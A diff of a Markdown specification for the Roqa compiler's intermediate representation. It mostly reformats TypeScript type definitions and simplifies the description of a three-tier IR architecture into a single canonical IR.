@@ -28,8 +28,8 @@ strips away prose and captures exactly what needs to be built. The code
 generator is the construction crew that reads the blueprint and builds the
 actual structure.
 
-The blueprint doesn't contain opinions about *how* to write the description or
-*how* to pour the concrete. It captures *what* exists: which rooms, which
+The blueprint doesn't contain opinions about _how_ to write the description or
+_how_ to pour the concrete. It captures _what_ exists: which rooms, which
 walls, which doors, where the plumbing goes.
 
 ### Properties of a good IR
@@ -72,10 +72,7 @@ The IR is defined as TypeScript types using discriminated unions. If you're not
 used to these, here's the pattern:
 
 ```ts
-type NodeIR =
-    | ElementIR
-    | TextIR
-    | ShowIR;
+type NodeIR = ElementIR | TextIR | ShowIR;
 ```
 
 This means: "a `NodeIR` is one of `ElementIR`, `TextIR`, or `ShowIR`." Each
@@ -91,11 +88,14 @@ To process an IR node, you switch on `kind`:
 
 ```ts
 function processNode(node: NodeIR) {
-    switch (node.kind) {
-        case "element": return processElement(node);
-        case "text":    return processText(node);
-        case "show":    return processShow(node);
-    }
+  switch (node.kind) {
+    case "element":
+      return processElement(node);
+    case "text":
+      return processText(node);
+    case "show":
+      return processShow(node);
+  }
 }
 ```
 
@@ -106,7 +106,7 @@ tag. It's the standard way to represent tree-structured data in compilers.
 
 IR nodes carry two kinds of information:
 
-- **Structural fields** describe *what* to build. The `tag` on an `ElementIR`,
+- **Structural fields** describe _what_ to build. The `tag` on an `ElementIR`,
   the `children` array, the `condition` on a `ShowIR`. These drive code
   generation.
 
@@ -137,11 +137,13 @@ A **reactive value** is a reference to state that can change at runtime:
 ```
 
 The code generator treats these fundamentally differently:
+
 - Static values (`LiteralExpr`) go into `template("<html>")` strings
 - Reactive values become cell declarations, binding setup, text node
   `nodeValue` updates, etc.
 
 A **cell-ref** vs a **state-read** matters too:
+
 - `cell-ref` = "give me the cell itself" — used by `showBlock()`,
   `forBlock()` for subscription
 - `state-read` = "give me the current value" — used in text content,
@@ -149,136 +151,71 @@ A **cell-ref** vs a **state-read** matters too:
 
 ---
 
-## The 3-Tier IR Architecture
+## Roqa IR in the compiler
 
-Roqa uses a three-level IR pipeline. This is the same pattern used by
-production compilers like LLVM (where C/Rust/Swift each have their own AST, but
-all compile to LLVM IR, which is then lowered to machine-specific instructions).
+Roqa frontends produce a single canonical IR: the Roqa IR documented here.
+This is the contract between frontend authors and the backend compiler.
 
-```txt
-┌─────────────────────────────────────────────────────────────────────┐
-│  HIGH-LEVEL IR (HIR)                                                │
-│  ─────────────────                                                  │
-│  One per authoring syntax. Captures intent in that syntax's terms.  │
-│  May contain sugar, shorthands, and syntax-specific concepts.       │
-│  "Loose" — multiple representations for the same concept are OK.    │
-│                                                                     │
-│  Examples:                                                          │
-│  - JSX HIR: JSX element nodes, expression containers, fragments     │
-│  - DSL HIR: domain-specific shorthand nodes, macro expansions       │
-│  - GUI builder HIR: drag-drop layout nodes, visual property panels  │
-│                                                                     │
-│  Each frontend is responsible for defining its own HIR and for      │
-│  normalizing it into valid MIR.                                     │
-└──────────────────────────┬──────────────────────────────────────────┘
-                           │ normalize(hir) → mir
-                           ▼
-┌─────────────────────────────────────────────────────────────────────┐
-│  MID-LEVEL IR (MIR) — THE CANONICAL IR                              │
-│  ────────────────────────────────────                               │
-│  THE contract between frontends and the backend.                    │
-│  Frontend-independent. Fully normalized. JSON-serializable.         │
-│  One representation for each concept — no sugar.                    │
-│  If it exists, it's structurally valid.                             │
-│                                                                     │
-│  This document primarily specifies the MIR.                         │
-└──────────────────────────┬──────────────────────────────────────────┘
-                           │ lower(mir) → lir
-                           ▼
-┌─────────────────────────────────────────────────────────────────────┐
-│  LOW-LEVEL IR (LIR)                                                 │
-│  ─────────────────                                                  │
-│  Directly maps to code generation operations.                       │
-│  High-level constructs decomposed into primitive ops.               │
-│  Template strings computed, traversal paths resolved,               │
-│  binding graphs materialized.                                       │
-│  Optimization passes operate at this level.                         │
-│  Not intended to be human-authored.                                 │
-│                                                                     │
-│  Specified in compiler.md.                                          │
-└─────────────────────────────────────────────────────────────────────┘
-```
-
-### Why three levels? (plain-speak)
-
-Think of it like building construction (extending the blueprint analogy from
-above).
-
-The **HIR** is like different architects' sketches — one draws in Art Deco
-style, another in Modernist, another in Japanese traditional. Each has its own
-conventions and idioms, but they're all describing buildings.
-
-The **MIR** is like standardized engineering blueprints — precise structural
-drawings that any construction team can read, regardless of which architect
-drew them. This is the universal format that all frontends must produce and the
-backend consumes.
-
-The **LIR** is like individual work orders for the construction crew — "cut
-2×4 to 96 inches, nail at stud positions 16″ on center, run 12/2 wire from
-panel to junction box at coordinates (x,y)." The crew needs them to build 
-exactly what the blueprints specify.
-
-The MIR is the most important because it's the **contract**. Frontend authors
-need to know: "if I produce this data structure, Roqa will generate correct,
-fast code." Backend developers need to know: "I only need to handle these node
-types in these configurations."
+Internally, the compiler performs additional lowering and optimization passes,
+but those internal representations are compiler implementation details. If you
+are building a frontend, the only IR you need to target is the Roqa IR defined
+in this document.
 
 ### What this document covers
 
-This document specifies the **MIR** (canonical IR) in full detail — it's the
-contract that matters most. The HIR is intentionally unspecified (each frontend
-defines its own). The LIR is specified in [compiler.md](./compiler.md) as part
-of the code generation pipeline. The runtime primitives the compiler targets
-are specified in [runtime.md](./runtime.md).
+This document specifies the Roqa IR in full detail — the frontend/backend
+contract that matters to external consumers. Internal compiler passes are
+specified separately in [compiler.md](./compiler.md), and the runtime
+primitives they target are specified in [runtime.md](./runtime.md).
 
 ---
 
-## MIR: Component IR
+## Component IR
 
 The root type. One per component definition.
 
 ```ts
 type ComponentIR = {
-    version: 1;                   // IR format version — increment on breaking changes
-    tagName: string;              // Custom element tag (e.g., "counter-button")
-    name: string;                 // Export/identifier name (e.g., "CounterButton")
+  version: 1; // IR format version — increment on breaking changes
+  tagName: string; // Custom element tag (e.g., "counter-button")
+  name: string; // Export/identifier name (e.g., "CounterButton")
 
-    state: StateIR[];
-    actions: ActionIR[];
-    props: PropIR[];
-    attrs: AttrIR[];
-    emits: EmitIR[];
-    lifecycle: LifecycleIR;
-    render: NodeIR[];             // The root children of the view tree
+  state: StateIR[];
+  actions: ActionIR[];
+  props: PropIR[];
+  attrs: AttrIR[];
+  emits: EmitIR[];
+  lifecycle: LifecycleIR;
+  render: NodeIR[]; // The root children of the view tree
 
-    // Component-scope `let` / `var` declarations from the original source.
-    // Emitted in component scope so that closures (event handlers, lifecycle
-    // callbacks, action bodies) can capture and assign to them.
-    locals?: LocalDeclIR[];
+  // Component-scope `let` / `var` declarations from the original source.
+  // Emitted in component scope so that closures (event handlers, lifecycle
+  // callbacks, action bodies) can capture and assign to them.
+  locals?: LocalDeclIR[];
 
-    // Miscellaneous top-level statements (e.g. `this.method = ...`) that
-    // execute in component scope after `locals` and before `lifecycle.onConnect`
-    // runs. Useful for exposing imperative APIs on the element.
-    preamble?: ExprIR[];
+  // Miscellaneous top-level statements (e.g. `this.method = ...`) that
+  // execute in component scope after `locals` and before `lifecycle.onConnect`
+  // runs. Useful for exposing imperative APIs on the element.
+  preamble?: ExprIR[];
 
-    metadata?: ComponentMetadata; // Optional non-structural information
+  metadata?: ComponentMetadata; // Optional non-structural information
 };
 
 type LocalDeclIR = {
-    kind: "let" | "var";
-    name: string;
-    init?: ExprIR;                // Optional initializer
+  kind: "let" | "var";
+  name: string;
+  init?: ExprIR; // Optional initializer
 };
 
 type ComponentMetadata = {
-    sourceFile?: string;          // Original source file path
-    frontend?: string;            // Which frontend produced this IR (e.g., "jsx", "builder")
-    imports?: ImportIR[];         // External dependencies
-    moduleCode?: string;          // Raw module-level helper code (constants,
-                                  // helper functions) to emit verbatim above
-                                  // the component definitions. Use sparingly —
-                                  // prefer structured imports + actions when
-                                  // possible.
+  sourceFile?: string; // Original source file path
+  frontend?: string; // Which frontend produced this IR (e.g., "jsx", "builder")
+  imports?: ImportIR[]; // External dependencies
+  moduleCode?: string; // Raw module-level helper code (constants,
+  // helper functions) to emit verbatim above
+  // the component definitions. Use sparingly —
+  // prefer structured imports + actions when
+  // possible.
 };
 ```
 
@@ -294,12 +231,12 @@ backend wires up sibling traversals (`firstChild` then `.nextSibling` chains)
 so that bindings on every root node are live.
 
 The `version` field is critical for the multi-frontend architecture. When the
-MIR format changes, frontends with outdated output are caught immediately with
+IR format changes, frontends with outdated output are caught immediately with
 a clear error message rather than producing subtly wrong code.
 
 ---
 
-## MIR: Expression IR
+## Expression IR
 
 Expressions are used in action bodies, computed values, lifecycle hooks, and
 inline event handlers. The expression IR is a small structured language for
@@ -321,37 +258,37 @@ strings, which defeats the purpose of having a frontend-independent IR.
 
 ```ts
 type ExprIR =
-    | LiteralExpr
-    | TemplateLiteralExpr
-    | ObjectExpr
-    | ArrayExpr
-    | StateReadExpr
-    | StateWriteExpr
-    | PropReadExpr
-    | AttrReadExpr
-    | ComputedReadExpr
-    | LocalReadExpr
-    | LetExpr
-    | BinaryExpr
-    | UnaryExpr
-    | ConditionalExpr
-    | MemberExpr
-    | IndexExpr
-    | SpreadExpr
-    | CallExpr
-    | MethodCallExpr
-    | NewExpr
-    | BlockExpr
-    | ReturnExpr
-    | CollectionOpExpr
-    | EmitExpr
-    | ActionCallExpr
-    | ClosureExpr
-    | ImportedRefExpr
-    | ExternalRefExpr
-    | AssignExpr
-    | UpdateExpr
-    | OpaqueExpr;
+  | LiteralExpr
+  | TemplateLiteralExpr
+  | ObjectExpr
+  | ArrayExpr
+  | StateReadExpr
+  | StateWriteExpr
+  | PropReadExpr
+  | AttrReadExpr
+  | ComputedReadExpr
+  | LocalReadExpr
+  | LetExpr
+  | BinaryExpr
+  | UnaryExpr
+  | ConditionalExpr
+  | MemberExpr
+  | IndexExpr
+  | SpreadExpr
+  | CallExpr
+  | MethodCallExpr
+  | NewExpr
+  | BlockExpr
+  | ReturnExpr
+  | CollectionOpExpr
+  | EmitExpr
+  | ActionCallExpr
+  | ClosureExpr
+  | ImportedRefExpr
+  | ExternalRefExpr
+  | AssignExpr
+  | UpdateExpr
+  | OpaqueExpr;
 ```
 
 ### Value expressions
@@ -359,8 +296,8 @@ type ExprIR =
 ```ts
 // A concrete value known at build time
 type LiteralExpr = {
-    kind: "literal";
-    value: string | number | boolean | null;
+  kind: "literal";
+  value: string | number | boolean | null;
 };
 
 // Template literal with interpolated expressions
@@ -369,60 +306,60 @@ type LiteralExpr = {
 // concatenation during codegen, since benchmarking shows concatenation
 // is consistently faster than template literals in hot paths.
 type TemplateLiteralExpr = {
-    kind: "template-literal";
-    parts: (string | ExprIR)[];   // Alternating static strings and expressions
-                                  // e.g., ["Hello ", <expr>, "!"] for `Hello ${name}!`
+  kind: "template-literal";
+  parts: (string | ExprIR)[]; // Alternating static strings and expressions
+  // e.g., ["Hello ", <expr>, "!"] for `Hello ${name}!`
 };
 
 // Construct a plain object literal: { key: value, ...spread }
 // Common in UI logic for creating new items, building payloads, merging objects.
 type ObjectExpr = {
-    kind: "object";
-    properties: ObjectPropertyIR[];
+  kind: "object";
+  properties: ObjectPropertyIR[];
 };
 
 type ObjectPropertyIR =
-    | { kind: "property"; key: string; value: ExprIR }
-    | { kind: "spread"; argument: ExprIR };
+  | { kind: "property"; key: string; value: ExprIR }
+  | { kind: "spread"; argument: ExprIR };
 
 // Construct an array literal: [a, b, ...rest]
 // Frontends should prefer this over OpaqueExpr for array creation so the
 // backend can analyze and optimize the contents.
 type ArrayExpr = {
-    kind: "array";
-    elements: ExprIR[];           // SpreadExpr is permitted as an element
+  kind: "array";
+  elements: ExprIR[]; // SpreadExpr is permitted as an element
 };
 
 // Read the current value of a state cell
 type StateReadExpr = {
-    kind: "state-read";
-    name: string;                 // Name of the state property
+  kind: "state-read";
+  name: string; // Name of the state property
 };
 
 // Write a new value to a state cell (triggers reactive updates)
 type StateWriteExpr = {
-    kind: "state-write";
-    name: string;                 // Name of the state property
-    value: ExprIR;                // The new value expression
+  kind: "state-write";
+  name: string; // Name of the state property
+  value: ExprIR; // The new value expression
 };
 
 // Read a prop value
 type PropReadExpr = {
-    kind: "prop-read";
-    name: string;
-    path?: string[];              // For nested access: ["url"] for props.story.url
+  kind: "prop-read";
+  name: string;
+  path?: string[]; // For nested access: ["url"] for props.story.url
 };
 
 // Read an attribute value
 type AttrReadExpr = {
-    kind: "attr-read";
-    name: string;
+  kind: "attr-read";
+  name: string;
 };
 
 // Read a computed value
 type ComputedReadExpr = {
-    kind: "computed-read";
-    name: string;
+  kind: "computed-read";
+  name: string;
 };
 
 // Read a name introduced by an enclosing scope. The set of valid scope
@@ -438,8 +375,8 @@ type ComputedReadExpr = {
 // Compiles to a bare identifier reference. Frontends MUST ensure the name
 // is in scope; the validator reports `unbound-local` for dangling reads.
 type LocalReadExpr = {
-    kind: "local-read";
-    name: string;
+  kind: "local-read";
+  name: string;
 };
 
 // Declare a local binding inside a `BlockExpr` body. The binding is in
@@ -459,9 +396,9 @@ type LocalReadExpr = {
 //     ]
 //   }
 type LetExpr = {
-    kind: "let";
-    name: string;
-    value: ExprIR;
+  kind: "let";
+  name: string;
+  value: ExprIR;
 };
 ```
 
@@ -474,9 +411,9 @@ access from a `LocalReadExpr` (the each loop's `itemAlias`) and a
 ```json
 // equivalent of accessing `todo.text` inside an each over `todos`:
 {
-    "kind": "member",
-    "object": { "kind": "local-read", "name": "todo" },
-    "property": "text"
+  "kind": "member",
+  "object": { "kind": "local-read", "name": "todo" },
+  "property": "text"
 }
 ```
 
@@ -488,45 +425,57 @@ This keeps the IR small and composes naturally with deeper paths
 ```ts
 // Binary operations: arithmetic, comparison, logical
 type BinaryExpr = {
-    kind: "binary";
-    op: "+" | "-" | "*" | "/" | "%" |
-        "===" | "!==" | ">" | "<" | ">=" | "<=" |
-        "&&" | "||" | "??" ;
-    left: ExprIR;
-    right: ExprIR;
+  kind: "binary";
+  op:
+    | "+"
+    | "-"
+    | "*"
+    | "/"
+    | "%"
+    | "==="
+    | "!=="
+    | ">"
+    | "<"
+    | ">="
+    | "<="
+    | "&&"
+    | "||"
+    | "??";
+  left: ExprIR;
+  right: ExprIR;
 };
 
 // Unary operations: negation, logical not
 type UnaryExpr = {
-    kind: "unary";
-    op: "!" | "-" | "typeof";
-    operand: ExprIR;
+  kind: "unary";
+  op: "!" | "-" | "typeof";
+  operand: ExprIR;
 };
 
 // Ternary conditional: condition ? consequent : alternate
 type ConditionalExpr = {
-    kind: "conditional";
-    test: ExprIR;
-    consequent: ExprIR;
-    alternate: ExprIR;
+  kind: "conditional";
+  test: ExprIR;
+  consequent: ExprIR;
+  alternate: ExprIR;
 };
 
 // Assignment to a target: target = value (and compound forms)
 // The target is typically a MemberExpr or IndexExpr — for cell writes,
 // always use StateWriteExpr instead so the backend can wire reactivity.
 type AssignExpr = {
-    kind: "assign";
-    op: "=" | "+=" | "-=" | "*=" | "/=" | "%=" | "??=" | "||=" | "&&=";
-    target: ExprIR;
-    value: ExprIR;
+  kind: "assign";
+  op: "=" | "+=" | "-=" | "*=" | "/=" | "%=" | "??=" | "||=" | "&&=";
+  target: ExprIR;
+  value: ExprIR;
 };
 
 // Increment / decrement: ++x, x++, --y, y--
 type UpdateExpr = {
-    kind: "update";
-    op: "++" | "--";
-    prefix: boolean;              // true for ++x, false for x++
-    target: ExprIR;
+  kind: "update";
+  op: "++" | "--";
+  prefix: boolean; // true for ++x, false for x++
+  target: ExprIR;
 };
 ```
 
@@ -535,24 +484,24 @@ type UpdateExpr = {
 ```ts
 // Property access: expr.property
 type MemberExpr = {
-    kind: "member";
-    object: ExprIR;
-    property: string;
+  kind: "member";
+  object: ExprIR;
+  property: string;
 };
 
 // Computed property access: expr[index]
 type IndexExpr = {
-    kind: "index";
-    object: ExprIR;
-    index: ExprIR;
+  kind: "index";
+  object: ExprIR;
+  index: ExprIR;
 };
 
 // Spread an iterable into an array or object context
 // Used in collection operations, function calls, and array/object construction.
 // e.g., [...existingItems, newItem] or fn(...args)
 type SpreadExpr = {
-    kind: "spread";
-    argument: ExprIR;
+  kind: "spread";
+  argument: ExprIR;
 };
 ```
 
@@ -561,28 +510,28 @@ type SpreadExpr = {
 ```ts
 // Function call: fn(args)
 type CallExpr = {
-    kind: "call";
-    callee: ExprIR;
-    args: ExprIR[];
+  kind: "call";
+  callee: ExprIR;
+  args: ExprIR[];
 };
 
 // Method call: obj.method(args)
 // Separate from CallExpr because it's very common and avoids
 // nested MemberExpr + CallExpr for the typical case
 type MethodCallExpr = {
-    kind: "method-call";
-    object: ExprIR;
-    method: string;
-    args: ExprIR[];
+  kind: "method-call";
+  object: ExprIR;
+  method: string;
+  args: ExprIR[];
 };
 
 // Constructor call: `new Constructor(args)` (e.g. `new Date()`, `new URL(s)`)
 // Frontends should prefer this over OpaqueExpr for instantiation so the
 // backend can analyze the arguments.
 type NewExpr = {
-    kind: "new";
-    callee: ExprIR;
-    args: ExprIR[];
+  kind: "new";
+  callee: ExprIR;
+  args: ExprIR[];
 };
 ```
 
@@ -591,8 +540,8 @@ type NewExpr = {
 ```ts
 // A sequence of expressions (evaluated in order, last value is the result)
 type BlockExpr = {
-    kind: "block";
-    body: ExprIR[];
+  kind: "block";
+  body: ExprIR[];
 };
 
 // `return <value>` — used inside ClosureExpr.body and BlockExpr to produce a
@@ -600,36 +549,36 @@ type BlockExpr = {
 // OpaqueExpr to preserve the `return` keyword (e.g. for `return { x, y }`
 // patterns inside a callback).
 type ReturnExpr = {
-    kind: "return";
-    value?: ExprIR;             // Omit for bare `return`
+  kind: "return";
+  value?: ExprIR; // Omit for bare `return`
 };
 
 // A closure / callback function
 type ClosureExpr = {
-    kind: "closure";
-    params: ClosureParam[];
-    body: ExprIR;
-    async?: boolean;              // true if the closure was declared `async`
+  kind: "closure";
+  params: ClosureParam[];
+  body: ExprIR;
+  async?: boolean; // true if the closure was declared `async`
 };
 
 // Closure parameters support both simple names and destructuring patterns.
 // Destructuring is common in array methods (e.g., .map(({ id, name }) => ...))
 // and event handlers.
 type ClosureParam =
-    | string                      // Simple parameter: "item"
-    | DestructuredParam;          // Destructured: "{ id, name }" or "[ first, ...rest ]"
+  | string // Simple parameter: "item"
+  | DestructuredParam; // Destructured: "{ id, name }" or "[ first, ...rest ]"
 
 type DestructuredParam = {
-    kind: "destructured";
-    pattern: "object" | "array";
-    bindings: DestructuredBinding[];
-    rest?: string;                // Rest element name: "...rest" → "rest"
+  kind: "destructured";
+  pattern: "object" | "array";
+  bindings: DestructuredBinding[];
+  rest?: string; // Rest element name: "...rest" → "rest"
 };
 
 type DestructuredBinding = {
-    key: string;                  // Property name (object) or index position (array)
-    alias?: string;               // Rename: { id: todoId } → key="id", alias="todoId"
-    default?: ExprIR;             // Default value: { count = 0 }
+  key: string; // Property name (object) or index position (array)
+  alias?: string; // Rename: { id: todoId } → key="id", alias="todoId"
+  default?: ExprIR; // Default value: { count = 0 }
 };
 ```
 
@@ -638,24 +587,24 @@ type DestructuredBinding = {
 ```ts
 // Collection operations: insert, remove, filter, etc.
 type CollectionOpExpr = {
-    kind: "collection-op";
-    op: "insert" | "remove" | "update" | "remove-where" | "move" | "clear";
-    name: string;                 // Name of the state collection
-    args: ExprIR[];               // Operation-specific arguments
+  kind: "collection-op";
+  op: "insert" | "remove" | "update" | "remove-where" | "move" | "clear";
+  name: string; // Name of the state collection
+  args: ExprIR[]; // Operation-specific arguments
 };
 
 // Dispatch a custom event
 type EmitExpr = {
-    kind: "emit";
-    event: string;                // Event name (e.g., "todo-added")
-    detail?: ExprIR;              // Optional event detail payload
+  kind: "emit";
+  event: string; // Event name (e.g., "todo-added")
+  detail?: ExprIR; // Optional event detail payload
 };
 
 // Call a sibling action by name
 type ActionCallExpr = {
-    kind: "action-call";
-    name: string;
-    args: ExprIR[];
+  kind: "action-call";
+  name: string;
+  args: ExprIR[];
 };
 ```
 
@@ -670,22 +619,23 @@ tree so the backend can track dependencies and generate correct imports.
 // Reference to a value imported from another module
 // e.g., import { formatDate } from "./utils.js" → use formatDate(timestamp)
 type ImportedRefExpr = {
-    kind: "imported-ref";
-    source: string;               // Module specifier: "./utils.js", "lodash/debounce"
-    name: string;                 // Imported binding name: "formatDate"
-    isDefault?: boolean;          // true for default imports
+  kind: "imported-ref";
+  source: string; // Module specifier: "./utils.js", "lodash/debounce"
+  name: string; // Imported binding name: "formatDate"
+  isDefault?: boolean; // true for default imports
 };
 
 // Reference to a global or built-in value
 // e.g., Math.floor, console.log, parseInt, JSON.stringify
 type ExternalRefExpr = {
-    kind: "external-ref";
-    name: string;                 // Top-level name: "Math", "console", "parseInt"
-    path?: string[];              // Property path: ["floor"] for Math.floor
+  kind: "external-ref";
+  name: string; // Top-level name: "Math", "console", "parseInt"
+  path?: string[]; // Property path: ["floor"] for Math.floor
 };
 ```
 
 These are preferable to `OpaqueExpr` because the backend can:
+
 - Verify that imported modules exist (during validation)
 - Deduplicate imports when multiple components use the same utility
 - Track which externals a component depends on (for tree-shaking, bundling)
@@ -695,18 +645,20 @@ For example, `Math.floor(value * 100)` is represented as:
 
 ```json
 {
-    "kind": "call",
-    "callee": {
-        "kind": "external-ref",
-        "name": "Math",
-        "path": ["floor"]
-    },
-    "args": [{
-        "kind": "binary",
-        "op": "*",
-        "left": { "kind": "state-read", "name": "value" },
-        "right": { "kind": "literal", "value": 100 }
-    }]
+  "kind": "call",
+  "callee": {
+    "kind": "external-ref",
+    "name": "Math",
+    "path": ["floor"]
+  },
+  "args": [
+    {
+      "kind": "binary",
+      "op": "*",
+      "left": { "kind": "state-read", "name": "value" },
+      "right": { "kind": "literal", "value": 100 }
+    }
+  ]
 }
 ```
 
@@ -719,10 +671,10 @@ IR, the less the backend can optimize.
 
 ```ts
 type OpaqueExpr = {
-    kind: "opaque";
-    source: string;               // Raw JavaScript source text
-    reads: string[];              // State cells read (must be manually declared)
-    writes: string[];             // State cells written (must be manually declared)
+  kind: "opaque";
+  source: string; // Raw JavaScript source text
+  reads: string[]; // State cells read (must be manually declared)
+  writes: string[]; // State cells written (must be manually declared)
 };
 ```
 
@@ -789,29 +741,26 @@ rather than relying on manual declaration.
 
 ---
 
-## MIR: State IR
+## State IR
 
 State declarations describe the reactive data the component owns.
 
 ```ts
-type StateIR =
-    | StateValueIR
-    | StateCollectionIR
-    | StateComputedIR;
+type StateIR = StateValueIR | StateCollectionIR | StateComputedIR;
 ```
 
 ### `StateValueIR` — simple reactive value
 
 ```ts
 type StateValueIR = {
-    kind: "value";
-    name: string;                 // The state property name
-    initial: unknown;             // The initial value (number, string, boolean, array, etc.)
-    initialExpr?: string;         // Raw JS source for non-literal initializers
-                                  // (e.g. `cell(FEEDS.top)`). When set, the
-                                  // backend evaluates this expression at
-                                  // runtime instead of using `initial`.
-    hints?: OptimizationHints;
+  kind: "value";
+  name: string; // The state property name
+  initial: unknown; // The initial value (number, string, boolean, array, etc.)
+  initialExpr?: string; // Raw JS source for non-literal initializers
+  // (e.g. `cell(FEEDS.top)`). When set, the
+  // backend evaluates this expression at
+  // runtime instead of using `initial`.
+  hints?: OptimizationHints;
 };
 ```
 
@@ -826,11 +775,11 @@ const count = cell(0);
 
 ```ts
 type StateCollectionIR = {
-    kind: "collection";
-    name: string;
-    key: string | null;           // String = key property name, null = identity
-    initial: unknown[];           // Initial array contents
-    hints?: OptimizationHints;
+  kind: "collection";
+  name: string;
+  key: string | null; // String = key property name, null = identity
+  initial: unknown[]; // Initial array contents
+  hints?: OptimizationHints;
 };
 ```
 
@@ -845,10 +794,10 @@ const todos = cell([]);
 
 ```ts
 type StateComputedIR = {
-    kind: "computed";
-    name: string;
-    body: ExprIR;                 // The computation as a structured expression
-    hints?: OptimizationHints;
+  kind: "computed";
+  name: string;
+  body: ExprIR; // The computation as a structured expression
+  hints?: OptimizationHints;
 };
 ```
 
@@ -859,33 +808,33 @@ needed — the expression structure is the source of truth.
 Backend output:
 
 ```ts
-const remaining = cell(() => get(todos).filter(t => !t.completed).length);
+const remaining = cell(() => get(todos).filter((t) => !t.completed).length);
 // After inlining: const remaining = { v: () => todos.v.filter(...), e: [] };
 ```
 
 ### `OptimizationHints` — frontend-provided optimization metadata
 
 Frontends may have information about state usage patterns that the backend
-can't infer from the MIR alone. Optimization hints are strictly advisory — the
+can't infer from the IR alone. Optimization hints are strictly advisory — the
 backend must produce correct code even if hints are absent or wrong, but
 correct hints enable better optimization.
 
 ```ts
 type OptimizationHints = {
-    writeOnce?: boolean;          // State is set once and never updated again
-                                  // Backend can skip reactive binding setup
-    maxItems?: number;            // Collection will never exceed this size
-                                  // Backend can use simpler reconciliation
-    pureComputed?: boolean;       // Computed has no side effects
-                                  // Backend can memoize or skip re-evaluation
-    hotPath?: boolean;            // This state updates very frequently (e.g., animation)
-                                  // Backend should optimize update path aggressively
-    immutable?: boolean;          // Value is never mutated (only replaced)
-                                  // Backend can use reference equality checks
-    escapesComponent?: boolean;   // Cell is observed outside this component
-                                  // (e.g., passed to children, read by external code)
-                                  // Backend should emit runtime subscriber notification
-                                  // See compiler.md §Hybrid reactive model
+  writeOnce?: boolean; // State is set once and never updated again
+  // Backend can skip reactive binding setup
+  maxItems?: number; // Collection will never exceed this size
+  // Backend can use simpler reconciliation
+  pureComputed?: boolean; // Computed has no side effects
+  // Backend can memoize or skip re-evaluation
+  hotPath?: boolean; // This state updates very frequently (e.g., animation)
+  // Backend should optimize update path aggressively
+  immutable?: boolean; // Value is never mutated (only replaced)
+  // Backend can use reference equality checks
+  escapesComponent?: boolean; // Cell is observed outside this component
+  // (e.g., passed to children, read by external code)
+  // Backend should emit runtime subscriber notification
+  // See compiler.md §Hybrid reactive model
 };
 ```
 
@@ -895,21 +844,21 @@ frontend that doesn't know or care about optimization can omit them entirely.
 
 ---
 
-## MIR: Node IR
+## Node IR
 
 The view tree. Every node the component renders is one of these types.
 
 ```ts
 type NodeIR =
-    | ElementIR
-    | DynamicElementIR
-    | TextIR
-    | ReactiveTextIR
-    | RawHtmlIR
-    | ShowIR
-    | SwitchIR
-    | EachIR
-    | TryIR;
+  | ElementIR
+  | DynamicElementIR
+  | TextIR
+  | ReactiveTextIR
+  | RawHtmlIR
+  | ShowIR
+  | SwitchIR
+  | EachIR
+  | TryIR;
 ```
 
 > **Implementation status.** As of v1, `ElementIR`, `TextIR`, `ReactiveTextIR`,
@@ -926,16 +875,16 @@ events, children, etc.
 
 ```ts
 type ElementIR = {
-    kind: "element";
-    tag: string;                  // HTML tag name (e.g., "div", "button")
-    refs?: RefIR[];               // Zero or more refs on this element
-    attributes: Record<string, ExprIR>;
-    events: EventBindingIR[];
-    children: NodeIR[];
-    classes?: ClassIR;
-    styles?: StyleIR;
-    loc?: SourceLocation;         // Optional source position metadata
-                                  //   (used by source-map emission only)
+  kind: "element";
+  tag: string; // HTML tag name (e.g., "div", "button")
+  refs?: RefIR[]; // Zero or more refs on this element
+  attributes: Record<string, ExprIR>;
+  events: EventBindingIR[];
+  children: NodeIR[];
+  classes?: ClassIR;
+  styles?: StyleIR;
+  loc?: SourceLocation; // Optional source position metadata
+  //   (used by source-map emission only)
 };
 
 // Refs. Only the `name` kind is currently honored by the backend.
@@ -943,19 +892,19 @@ type ElementIR = {
 // frontends targeting v2 can plan, and so adding runtime support later is
 // non-breaking.
 type RefIR =
-    | { kind: "name"; name: string }              // Named lifecycle slot
-    | { kind: "callback"; handler: ExprIR }       // Function called with the node
-    | { kind: "binding"; target: ExprIR };        // Assign node into a state cell
-                                                  //   or other writable target
+  | { kind: "name"; name: string } // Named lifecycle slot
+  | { kind: "callback"; handler: ExprIR } // Function called with the node
+  | { kind: "binding"; target: ExprIR }; // Assign node into a state cell
+//   or other writable target
 
 // Source position metadata. Optional on every IR node; used only by the
 // source-map emitter. Absence is fine — the backend produces correct output
 // either way.
 type SourceLocation = {
-    start: { line: number; column: number };
-    end?: { line: number; column: number };
-    source?: string;              // Absolute or relative path to the original
-                                  //   source file (overrides ComponentMetadata.sourceFile)
+  start: { line: number; column: number };
+  end?: { line: number; column: number };
+  source?: string; // Absolute or relative path to the original
+  //   source file (overrides ComponentMetadata.sourceFile)
 };
 ```
 
@@ -963,15 +912,15 @@ type SourceLocation = {
 
 ```ts
 type DynamicElementIR = {
-    kind: "dynamic-element";
-    tag: ExprIR;                  // Expression resolving to a tag name string
-    refs?: RefIR[];
-    attributes: Record<string, ExprIR>;
-    events: EventBindingIR[];
-    children: NodeIR[];
-    classes?: ClassIR;
-    styles?: StyleIR;
-    loc?: SourceLocation;
+  kind: "dynamic-element";
+  tag: ExprIR; // Expression resolving to a tag name string
+  refs?: RefIR[];
+  attributes: Record<string, ExprIR>;
+  events: EventBindingIR[];
+  children: NodeIR[];
+  classes?: ClassIR;
+  styles?: StyleIR;
+  loc?: SourceLocation;
 };
 ```
 
@@ -992,6 +941,7 @@ or any other expression. This means attributes can hold computed expressions
 `OpaqueExpr`.
 
 The code generator splits this into:
+
 - **Template**: the tag + static attributes (those with `LiteralExpr` values) → HTML string
 - **Traversal**: firstChild/nextSibling chains to reach dynamic points
 - **Bindings**: non-literal attribute expressions → binding setup
@@ -1014,8 +964,8 @@ directly into the template HTML string.
 
 ```ts
 type TextIR = {
-    kind: "text";
-    value: string;
+  kind: "text";
+  value: string;
 };
 ```
 
@@ -1025,9 +975,9 @@ Goes directly into the template HTML string. No binding needed.
 
 ```ts
 type ReactiveTextIR = {
-    kind: "reactive-text";
-    source: ExprIR;               // Expression to display (typically StateReadExpr,
-                                  // ComputedReadExpr, PropReadExpr, or LocalReadExpr / MemberExpr)
+  kind: "reactive-text";
+  source: ExprIR; // Expression to display (typically StateReadExpr,
+  // ComputedReadExpr, PropReadExpr, or LocalReadExpr / MemberExpr)
 };
 ```
 
@@ -1063,10 +1013,10 @@ to subscribe to.
 
 ```ts
 type ShowIR = {
-    kind: "show";
-    condition: CellRef;           // Cell to subscribe to
-    render: NodeIR[];             // View tree when truthy
